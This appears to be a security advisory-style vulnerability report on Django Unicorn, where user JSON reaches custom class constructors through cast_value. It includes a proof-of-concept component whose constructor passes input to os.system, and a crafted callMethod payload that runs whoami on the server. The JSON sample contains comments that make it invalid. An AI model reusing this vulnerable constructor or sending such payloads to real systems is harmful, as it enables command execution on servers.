## Vulnerability List:

- Vulnerability Name: Insecure Deserialization / Arbitrary Code Execution via Custom Class Constructor
  - Description:
    1. An attacker identifies a Django Unicorn component with a method that accepts a custom class as an argument and uses type hinting.
    2. The attacker crafts a malicious JSON payload for a `callMethod` action. This payload is designed to be passed as keyword arguments to the constructor of the custom class.
    3. The attacker sends this payload to the Unicorn message endpoint.
    4. Django Unicorn's backend deserializes the JSON payload and, due to type hinting, attempts to instantiate the custom class using the provided data as keyword arguments.
    5. If the custom class constructor is vulnerable to insecure deserialization or code injection through its arguments, the attacker can achieve arbitrary code execution on the server or other malicious outcomes.

  - Impact: Arbitrary code execution on the server, potentially leading to full system compromise, data breach, or denial of service. The severity depends on the actions performed within the vulnerable custom class constructor.
  - Vulnerability Rank: Critical
  - Currently Implemented Mitigations:
    - None. The framework utilizes type hinting and `cast_value` for type conversion but does not sanitize or validate data passed to custom class constructors. The `serializer.py` file, which handles serialization and deserialization within Django Unicorn, does not include any specific mitigations for this type of vulnerability.
  - Missing Mitigations:
    - Input validation and sanitization should be implemented within custom class constructors to prevent insecure deserialization and code injection.
    - Consider restricting the instantiation of arbitrary classes from user input. A whitelist of safe custom classes or a safer deserialization mechanism could be introduced within `django_unicorn/typer.py` in the `cast_value` function.
    - Developers should be strongly warned in the documentation about the security risks of using custom classes as type hints for component methods, emphasizing the importance of secure constructor implementations.
  - Preconditions:
    - The application must use Django Unicorn components.
    - A specific component must have a method that accepts a custom class as an argument with type hinting.
    - The constructor of this custom class must be vulnerable to insecure deserialization or code injection based on the arguments it receives.
    - The attacker must be aware of the component's method name and argument name to craft the exploit.
  - Source Code Analysis:
    1. File: `django_unicorn\views\action_parsers\call_method.py` -> Function: `_call_method_name`
       ```python
       def _call_method_name(component: UnicornView, method_name: str, args: Tuple[Any], kwargs: Dict[str, Any]) -> Any:
           ...
           for argument in arguments:
               if argument in type_hints:
                   type_hint = type_hints[argument]
                   ...
                   if is_model:
                       ...
                   elif argument in kwargs:
                       parsed_kwargs[argument] = cast_value(type_hint, kwargs[argument])
                   elif len(args) > len(parsed_args):
                       parsed_args.append(cast_value(type_hint, args[len(parsed_args)]))
                   ...
           ...
       ```
       - This function handles the invocation of component methods. It retrieves type hints for method arguments and uses `cast_value` for type conversion. User-provided data in `kwargs` and `args` is passed to `cast_value`.

    2. File: `django_unicorn\typer.py` -> Function: `cast_value`
       ```python
       def cast_value(type_hint: Any, value: Any) -> Any:
           ...
           elif is_dataclass(type_hint):
               value = type_hint(**value) # Vulnerable line
           ...
           return value
       ```
       - The `cast_value` function, when dealing with dataclasses (and potentially other custom classes), directly instantiates them using `type_hint(**value)`. The `value` dictionary, derived from user input, is passed as keyword arguments to the class constructor without any sanitization or validation by Django Unicorn itself. This allows an attacker to control the arguments passed to the constructor if the method argument has a custom class type hint.

    - Visualization:

      ```mermaid
      graph LR
          A[User Request (malicious payload)] --> B(Django Unicorn Message Endpoint)
          B --> C(action_parsers.call_method.handle)
          C --> D(_call_method_name)
          D --> E(typer.cast_value)
          E --> F{is_dataclass(type_hint)?}
          F -- Yes --> G[type_hint(**value) - Vulnerable Constructor]
          G --> H[Arbitrary Code Execution or Insecure Deserialization]
          F -- No --> I[Other type casting]
      ```

  - Security Test Case:
    1. Create a component with a vulnerable method and custom class type hint.
       ```python
       # example/unicorn/components/exploit_component.py
       from django_unicorn.components import UnicornView

       class VulnerableClass:
           def __init__(self, cmd):
               import os
               os.system(cmd) # Insecure: arbitrary command execution - FOR DEMONSTRATION ONLY, DO NOT USE in production or real tests

       class ExploitView(UnicornView):
           def vulnerable_method(self, arg: VulnerableClass):
               pass # Method itself doesn't need to do anything for exploit
       ```

    2. Create a template to render this component in `example/unicorn/templates/components/exploit_component.html`:
       ```html
       <div>
           This is the exploit component.
       </div>
       ```

    3. Create a view in `example/www/views.py` to render the component:
       ```python
       # example/www/views.py
       from django.shortcuts import render
       from django.http import HttpResponse

       def exploit_view(request):
           return render(request, 'www/exploit.html')
       ```

    4. Create a template `example/www/exploit.html`:
       ```html
       {% load unicorn %}
       <html>
       <head>
           <title>Exploit Test</title>
       </head>
       <body>
           <h1>Exploit Test</h1>
           {% unicorn 'exploit-component' %}
           {% unicorn_scripts %}
       </body>
       </html>
       ```

    5. Add URL to `example/project/urls.py`:
       ```python
       # example/project/urls.py
       from django.urls import path
       from example.www import views

       urlpatterns = [
           ...
           path("exploit", views.exploit_view, name="exploit"),
           ...
       ]
       ```

    6. Run the Django development server.

    7. Craft a POST request to the Unicorn message endpoint. Use a tool like `curl` or `Postman`. The URL will be something like `http://127.0.0.1:8000/message/unicorn.components.exploit_component.ExploitView`. The JSON payload should be:
       ```json
       {
         "actionQueue": [
           {
             "payload": {
               "name": "vulnerable_method",
               "kwargs": {
                 "arg": { "cmd": "whoami > /tmp/unicorn_exploit.txt" } # Example: Writes output of whoami command to a file
               }
             },
             "type": "callMethod"
           }
         ],
         "data": {},
         "checksum": "...", # Replace with a valid checksum - can be an empty string for this test, or generate a valid one.
         "id": "exploit-component-id", # Replace with any component id.
         "epoch": 1691500000 # Replace with a timestamp
       }
       ```
       **Note:** You will need to calculate and insert a valid checksum. For testing purposes, an empty string might suffice, but for real applications, a proper checksum is needed.

    8. Send the POST request.

    9. Check if the command `whoami > /tmp/unicorn_exploit.txt` was executed on the server. You can check for the existence of the `/tmp/unicorn_exploit.txt` file and its content to confirm successful command execution. For safer testing, replace `os.system` with a logging mechanism or file writing that does not pose a security risk to the test environment.

    This test case will demonstrate the potential for arbitrary command execution due to insecure handling of custom class instantiation via user-controlled input.
